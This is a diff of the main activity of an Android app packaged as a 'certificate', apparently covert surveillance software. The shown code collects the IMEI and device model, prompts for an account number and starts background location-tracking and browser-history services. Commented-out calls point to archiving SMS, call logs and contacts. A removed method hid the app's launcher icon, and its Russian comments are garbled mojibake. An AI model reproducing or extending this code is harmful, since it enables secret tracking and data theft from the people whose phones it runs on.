@@ -12,35 +12,31 @@ import org.json.JSONObject;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
-import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
 
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
-import com.inet.android.location.GPSTracker;
-import com.inet.android.request.DataRequest;
-import com.inet.android.request.StartRequest;
+import com.inet.android.location.LocationTracker;
+import com.inet.android.request.Request4;
 import com.inet.android.utils.Logging;
 
 public class MainActivity extends Activity {
 	Button install;
 	Button exit;
-	GPSTracker gps;
+	LocationTracker gps;
 	LinkService link;
 	AlertDialog.Builder ad;
 	Context context;
@@ -56,71 +52,93 @@ public class MainActivity extends Activity {
 	List<String> result;
 	File root;
 	File[] fileArray;
-	private String sIMEI;
 	private String sID;
-//	private String account;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
 		// setContentView(R.layout.activity_main);
-
-		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
-		
 		context = getApplicationContext();
+		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
 
-		sp = PreferenceManager
-				.getDefaultSharedPreferences(getApplicationContext());
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String androidVersion = android.os.Build.VERSION.RELEASE;
-
+		// ListApp listApp = new ListApp();
+		// listApp.getListOfInstalledApp(context);
+		// GetInfo getInfo = new GetInfo(context);
+		// getInfo.getInfo();
+		// GetContacts getCont = new GetContacts();
+		// getCont.execute(context);
+		// ArchiveSms arhSms = new ArchiveSms();
+		// arhSms.execute(context);
+		// ArchiveCall arhCall = new ArchiveCall();
+		// arhCall.execute(context);
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
-		sIMEI = imeistring;
+		// sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
-		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
-		e.putString("imei", "0001");
+		e.putString("BUILD", "V_000.1");
+		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
 		e.putString("model", model);
+		e.putString("account", "account");
+
 		e.commit();
 
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
-
+		boolean getInfo = sp.getBoolean("getInfo", false);
 		if (!hasVisited) {
-			// проверка на первый запуск
+			// РїСЂРѕРІРµСЂРєР° РЅР° РїРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє
+
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
+			e.putBoolean("getInfo", true);
+			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время для сервиса истроии браузера
-			e.putString("period", "1"); // периодический запрос каждые 10 минут
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // РІСЂРµРјСЏ
+																				// РґР»СЏ
+																				// СЃРµСЂРІРёСЃР°
+																				// РёСЃС‚СЂРѕРё
+																				// Рё
+																				// Р±СЂР°СѓР·РµСЂР°
+			e.putString("period", "1"); // РїРµСЂРёРѕРґРёС‡РµСЃРєРёР№ Р·Р°РїСЂРѕСЃ РєР°Р¶РґС‹Рµ 10 РјРёРЅСѓС‚
 			e.putString("code", "-1");
 			e.commit();
-			
-//			hideIcon();
-		}
-		
-		getID(); // рекурсивный поиск файла с нужным именем
-		if (sp.getString("ID", "ID").equals("ID")) {
 
-			Logging.doLog(LOG_TAG, "File not found. Show dialog.", "File not found. Show dialog.");
-			
+			// hideIcon();
+		}
+
+		if (getID()) {
+			Logging.doLog(LOG_TAG, "getID return true");
+		} else {
+			Logging.doLog(LOG_TAG, "getID return false");
+		}
+		if (sp.getString("account", "account").equals("account")) {
+
+			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
+					"File not found. Show dialog.");
 			viewIDDialog();
-		} else
+		} else {
+			Logging.doLog(LOG_TAG, "not show dialog");
+
 			finish();
+		}
 	}
-	
+
 	@Override
-	public void onConfigurationChanged(Configuration newConfig) {  
-	        super.onConfigurationChanged(newConfig);  
+	public void onConfigurationChanged(Configuration newConfig) {
+		super.onConfigurationChanged(newConfig);
 	}
+
 	private boolean viewIDDialog() {
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
-		alert.setTitle("Ввод account number");
-		alert.setMessage("Введите account number. Нет права на ошибку!");
+		alert.setTitle("Attention!!!");
+		alert.setMessage("Enter account number!");
 
 		final EditText input = new EditText(this);
 		alert.setView(input);
@@ -130,15 +148,29 @@ public class MainActivity extends Activity {
 				String value = input.getText().toString();
 
 				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
-				
-				sp = PreferenceManager
-						.getDefaultSharedPreferences(getApplicationContext());
-				Editor e = sp.edit();
+
+				e = sp.edit();
 				e.putString("account", value);
 				e.commit();
-				start(); // запуск сервисов
-//				sendDiagPost();
-//				sendStartRequest();
+
+				SharedPreferences sp = PreferenceManager
+						.getDefaultSharedPreferences(getApplicationContext());
+				Logging.doLog(LOG_TAG, "send start request, imei: ",
+						sp.getString("imei", "imei"));
+
+				JSONObject jsonObject = new JSONObject();
+				try {
+					jsonObject.put("account", sp.getString("account", "0000"));
+					jsonObject.put("imei", sp.getString("imei", "imei"));
+					jsonObject.put("model", sp.getString("model", "0000"));
+				} catch (JSONException e) {
+					e.printStackTrace();
+				}
+
+				// String str = jsonObject.toString();
+				// StartRequest sr = new StartRequest(getApplicationContext());
+				// sr.sendRequest(str);
+				start(); // Р·Р°РїСѓСЃРє СЃРµСЂРІРёСЃРѕРІ
 				finish();
 			}
 		});
@@ -155,35 +187,16 @@ public class MainActivity extends Activity {
 		return true;
 	}
 
-	public void sendDiagPost() {
-		String diag = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>"
-				+ logTime() + "</time><type>1</type><ttl>"
-				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
-				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
-				+ "</cls><url>"
-				+ Long.toString(System.currentTimeMillis())
-				+ sp.getString("ABOUT", "about") + "</url></packet>";
-
-		Logging.doLog(LOG_TAG, "MainAct diagRequest: before req", "MainAct diagRequest: before req");
-
-//		RequestMakerImpl req = new RequestMakerImpl(context);
-//		req.sendDataRequest(diag);
-		DataRequest dr = new DataRequest(context);
-		dr.sendRequest(diag);
-		
-		Logging.doLog(LOG_TAG, "MainAct diagRequest: post req", "MainAct diagRequest: post req");
-	}
-
-	public void getID() {
+	public boolean getID() {
 		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
-		
+
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
-		recursiveFileFind(file);
+		return recursiveFileFind(file);
 	}
 
 	public boolean recursiveFileFind(File[] file1) {
 		int i = 0;
-		String filePath = "";
+		String filePath = " ";
 		if (file1 != null) {
 			while (i != file1.length) {
 				filePath = file1[i].getAbsolutePath();
@@ -200,11 +213,9 @@ public class MainActivity extends Activity {
 					e = sp.edit();
 					e.putString("account", ID);
 					e.commit();
-//					Log.d("ID", sp.getString("ID", "ID"));
+					// Log.d("ID", sp.getString("ID", "ID"));
 					if (!sp.getString("account", "account").equals("account")) {
-//						sendStartRequest();
-//						sendDiagPost();
-						start(); // запуск сервисов
+						start();
 						return true;
 					}
 					break;
@@ -216,28 +227,9 @@ public class MainActivity extends Activity {
 		return false;
 	}
 
-	private void sendStartRequest() {
-//		RequestMaker service = new RequestMakerImpl(context);
-//		String str = "\"";
-//		service.sendStartRequest(str);
-		JSONObject jsonObject = new JSONObject();
-		try {
-			jsonObject.put("account", sp.getString("account", "0000"));
-			jsonObject.put("imei", sp.getString("imei", "0000"));
-			jsonObject.put("model", "iphone");
-		} catch (JSONException e) {
-			e.printStackTrace();
-		}
-		
-		String str = jsonObject.toString();
-		StartRequest sr = new StartRequest(context);
-		sr.sendRequest(str);
-		
-		Logging.doLog(LOG_TAG, "start services", "start Request4");
-
-		startService(new Intent(MainActivity.this, Request4.class));
-	}
-
+	/**
+	 * Start services
+	 */
 	public void start() {
 		Logging.doLog(LOG_TAG, "start services", "start services");
 
@@ -249,20 +241,10 @@ public class MainActivity extends Activity {
 			e.printStackTrace();
 		}
 
-		startService(new Intent(MainActivity.this, GPSTracker.class));
+		startService(new Intent(MainActivity.this, LocationTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
-		
+
 		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
-	}
-
-	public void hideIcon() {
-		ComponentName componentToDisable = new ComponentName(
-				"com.inet.android.certificate",
-				"com.inet.android.bs.MainActivity");
-
-		getPackageManager().setComponentEnabledSetting(componentToDisable,
-				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-				PackageManager.DONT_KILL_APP);
 	}
 
 	@Override
@@ -270,14 +252,5 @@ public class MainActivity extends Activity {
 		// Inflate the menu; this adds items to the action bar if it is present.
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
-	}
-
-	@SuppressLint("SimpleDateFormat")
-	private static String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
 	}
 }
